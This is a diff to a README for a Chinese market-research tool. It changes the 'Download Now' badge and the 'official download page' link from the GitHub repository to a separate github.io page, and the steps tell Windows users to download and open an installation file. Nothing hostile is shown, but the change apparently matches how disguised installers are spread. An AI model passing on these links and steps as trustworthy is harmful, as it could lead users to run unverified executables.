@@ -1,6 +1,6 @@
 # 📉 industry-deep-research-report - Generate expert market insights with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Shevin0147/industry-deep-research-report)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://shevin0147.github.io)
 
 This tool provides decision-grade research on the Chinese market. It uses an automated system to gather data and verify facts. You gain a clear view of market trends and competitive landscapes without performing manual searches. The software organizes web data into evidence packs to support your business decisions.
 
@@ -26,7 +26,7 @@ To run this application on your Windows computer, you need the following:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official download page](https://github.com/Shevin0147/industry-deep-research-report).
+1. Visit the [official download page](https://shevin0147.github.io).
 2. Locate the link to download the installation file.
 3. Save the file to your computer.
 4. Open the downloaded file to start the installation wizard.
